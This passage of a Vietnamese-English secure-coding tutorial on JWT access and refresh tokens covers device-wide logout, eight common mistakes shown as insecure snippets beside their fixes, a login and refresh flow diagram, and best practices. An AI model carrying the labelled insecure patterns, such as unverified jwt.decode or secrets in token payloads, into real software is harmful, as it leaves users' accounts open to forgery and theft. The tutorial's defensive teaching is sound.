  // → Phải login lại ở tất cả devices
  
  // 📝 Log event (audit trail)
  await logEvent({
    type: 'LOGOUT_ALL_DEVICES',  // 📝 Event type
    userId,  // 👤 User ID
    timestamp: new Date(),  // ⏰ Thời gian
  });
  
  res.json({ message: 'Logged out from all devices' });  // ✅ Success
});

// 📝 Use cases (Khi nào dùng?):
// ✅ 🚨 User nghi ngờ account bị hack (thấy hoạt động lạ)
// ✅ 🔑 Change password → logout all devices (force re-login)
// ✅ 👨‍💻 Admin revoke access (suspend account, security breach)
// ✅ 📱 User mất thiết bị (phone/laptop stolen)
// ✅ 🛡️ Compliance requirement (logout sau khi thay đổi quyền)
```

---

#### **⚠️ 5. Common Security Mistakes (Lỗi Bảo Mật Thường Gặp)**

```typescript
// ❌ LỖI 1: Lưu token trong localStorage (XSS RISK - Cực kỳ nguy hiểm!)
localStorage.setItem('accessToken', token);  // ❌ XSS có thể đọc qua localStorage.getItem()
// → Hacker inject <script> có thể đánh cắp token

// ✅ ĐÚNG: Lưu trong memory (biến toàn cục)
let accessToken: string | null = null;  // 💾 Lưu trong RAM, mất khi refresh

// ────────────────────────────────────────

// ❌ LỖI 2: Access Token thời hạn quá dài (Tăng thiệt hại nếu leak)
jwt.sign(payload, secret, { expiresIn: '30d' });  // ❌ Quá lâu! (30 ngày)
// → Nếu token bị leak, hacker dùng được 30 ngày!

// ✅ ĐÚNG: 5-15 phút (ngắn - giảm window of attack)
jwt.sign(payload, secret, { expiresIn: '15m' });  // ✅ 15 phút

// ────────────────────────────────────────

// ❌ LỖI 3: Không verify token signature (Tin client blindly)
const decoded = jwt.decode(token);  // ❌ Chỉ decode Base64, KHÔNG verify signature!
// → Hacker có thể tự tạo token giả (sửa payload, fake signature)

// ✅ ĐÚNG: Verify signature (kiểm tra chữ ký)
jwt.verify(token, secret, (err, decoded) => { ... });  // ✅ Xác thực chữ ký
// → Chỉ accept token hợp lệ (signature đúng, chưa hết hạn)

// ────────────────────────────────────────

// ❌ LỖI 4: Không revoke refresh token khi logout (Token vẫn sống)
// User logout → token vẫn valid → hacker có thể dùng được
// → Không thể thu hồi token sau khi logout

// ✅ ĐÚNG: Revoke token vào database blacklist
await db.revokeRefreshToken(tokenId);  // 🗄️ Set isRevoked = true
// → Token bị vô hiệu hóa, không dùng lại được

// ────────────────────────────────────────

// ❌ LỖI 5: Gửi sensitive data trong token (Payload KHÔNG mã hóa!)
jwt.sign({
  password: user.password,  // ❌ NEVER! (Password trong token - cực nguy hiểm)
  creditCard: user.creditCard,  // ❌ NEVER! (Credit card info)
  ssn: user.ssn,  // ❌ NEVER! (Social Security Number)
}, secret);
// → Payload chỉ Base64 encode (ai cũng decode được!)

// ✅ ĐÚNG: Chỉ non-sensitive data (ID, name, role)
jwt.sign({
  sub: user.id,  // ✅ User ID (public identifier)
  name: user.name,  // ✅ Tên (đã public trên UI)
  role: user.role,  // ✅ Role (cần cho phân quyền)
}, secret);

// ────────────────────────────────────────

// ❌ LỖI 6: Không check token blacklist (Tin JWT blindly)
// Token bị revoke nhưng vẫn accept (JWT vẫn valid signature)
// → User logout nhưng token vẫn dùng được

// ✅ ĐÚNG: Check blacklist trong database
const tokenRecord = await db.findRefreshToken(tokenId);  // 🔍 Tìm token
if (!tokenRecord || tokenRecord.isRevoked) {  // ❌ Token bị revoke
  return res.status(403).json({ error: 'Token revoked' });
}
// → Chỉ accept token chưa bị revoke

// ────────────────────────────────────────

// ❌ LỖI 7: Không rate limit refresh endpoint (Brute force attack)
// Hacker brute force refresh endpoint (spam requests)
// → DDoS, resource exhaustion

// ✅ ĐÚNG: Rate limit (giới hạn số requests)
app.use('/auth/refresh', rateLimit({  // 🛡️ Middleware rate limit
  windowMs: 15 * 60 * 1000,  // ⏰ 15 phút window
  max: 10,  // 🔢 Max 10 requests / 15 phút
  message: 'Too many refresh requests, please try again later',
}));
// → Block brute force, DDoS attacks

// ────────────────────────────────────────

// ❌ LỖI 8: Không log security events (Không track security incidents)
// Không biết khi nào bị attack, không audit trail
// → Không phát hiện breach, không compliance

// ✅ ĐÚNG: Log everything (mọi security events)
await logEvent({  // 📝 Audit logging
  type: 'LOGIN_FAILED',  // 🚨 Event type (LOGIN_SUCCESS, LOGIN_FAILED, etc.)
  username,  // 👤 Username attempt
  ipAddress: req.ip,  // 🌐 IP address (geo-location)
  reason: 'Invalid password',  // 📋 Lý do fail
  timestamp: new Date(),  // ⏰ Thời gian
});
// → Detect brute force, track suspicious activities, compliance audit trail
```

---

#### **📊 6. Complete Flow Diagram**

```
┌────────────────────────────────────────────────────────────────────┐
│           COMPLETE AUTHENTICATION FLOW                             │
│      (Banking/Trading System - Hệ Thống Ngân Hàng)                │
└────────────────────────────────────────────────────────────────────┘

1️⃣ LOGIN
   User                     Frontend                Backend
    │                          │                       │
    │─── Enter credentials ──→│                       │
    │                          │─── POST /login ─────→│
    │                          │    {username, pwd}    │
    │                          │                       │
    │                          │                       │─ Verify credentials
    │                          │                       │─ Generate tokens
    │                          │                       │─ Save refresh token
    │                          │                       │
    │                          │←─ Set-Cookie ────────│
    │                          │   refreshToken        │
    │                          │   (httpOnly)          │
    │                          │                       │
    │                          │←─ { accessToken } ───│
    │←─ Redirect /dashboard ─│                       │
    │                          │                       │
    └─ accessToken in memory  │                       │

2️⃣ API CALL
   User                     Frontend                Backend
    │                          │                       │
    │─── Click "View Balance"→│                       │
    │                          │─ GET /balance ──────→│
    │                          │   Authorization:      │
    │                          │   Bearer <token>      │
    │                          │                       │
    │                          │                       │─ Verify token
    │                          │                       │─ Check permissions
    │                          │                       │
    │                          │←─ { balance: 1M } ───│
    │←─ Display balance ──────│                       │

3️⃣ TOKEN REFRESH (Auto - mỗi 14 phút)
   Frontend                Backend
      │                       │
      │─ POST /auth/refresh →│
      │   Cookie:             │
      │   refreshToken        │
      │                       │
      │                       │─ Verify refresh token
      │                       │─ Check not revoked
      │                       │─ Generate new access token
      │                       │
      │←─ { accessToken } ───│
      │                       │
   Update accessToken         │
   in memory                  │

4️⃣ LOGOUT
   User                     Frontend                Backend
    │                          │                       │
    │─── Click "Logout" ─────→│                       │
    │                          │─ POST /logout ──────→│
    │                          │   Cookie:             │
    │                          │   refreshToken        │
    │                          │                       │
    │                          │                       │─ Revoke token
    │                          │                       │─ Clear cookie
    │                          │                       │
    │                          │←─ { success } ───────│
    │                          │                       │
    │                          │─ accessToken = null   │
    │                          │─ Clear localStorage   │
    │←─ Redirect /login ──────│                       │
```

---

#### **💡 Summary (Tóm Tắt)**

**Access Token 🔑**
- **15 phút**, lưu **memory**, dùng gọi API
- Mất khi refresh page → re-fetch từ refresh token

**Refresh Token 🔄**
- **30 ngày**, lưu **httpOnly cookie**, dùng lấy access token
- Secure: httpOnly + Secure + SameSite=Strict

**Best Practices 🛡️**
- ✅ Never localStorage (XSS risk)
- ✅ httpOnly cookie cho refresh token
- ✅ Short-lived access token (15 phút)
- ✅ Token rotation (refresh → new token)
- ✅ Revoke tokens khi logout
- ✅ Rate limiting
- ✅ Inactivity timeout (5-10 phút)
- ✅ Device fingerprinting
- ✅ Audit logging

**Khi Nào Logout:**
- User click logout ✅
- Inactivity > 5 phút ✅
- Refresh token expired ✅
- Suspicious activity detected ✅
- User change password ✅
- Admin revoke access ✅

**Khi Nào Giữ Session:**
- User đang hoạt động (reset timer)
- Refresh token còn valid
- Device trusted
- No security alerts

**Key Takeaway:**
- **Banking/Trading** yêu cầu bảo mật CỰC CAO
- **2 tokens** (access + refresh) = balance giữa UX và security
- **httpOnly cookie** = chống XSS
- **Short-lived tokens** = giảm impact khi leak
- **Audit logging** = detect suspicious activities
- **Multi-factor** everything (MFA, device fingerprint, inactivity timeout)

